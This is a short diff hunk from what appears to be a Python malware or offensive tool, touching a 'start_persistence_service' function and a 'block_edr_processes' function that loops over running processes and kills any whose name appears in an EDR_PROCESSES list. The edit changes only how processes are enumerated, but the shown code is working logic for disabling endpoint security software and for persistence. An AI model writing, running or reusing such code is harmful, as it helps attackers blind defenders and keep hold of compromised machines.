@@ -79,7 +79,7 @@ def start_persistence_service(service_name):
         pass
 
 def block_edr_processes():
-    for proc in psutil.process_iter(['pid', 'name']):
+    for proc in psutil.process_iter():
         try:
             if proc.name() in EDR_PROCESSES:
                 proc.kill()
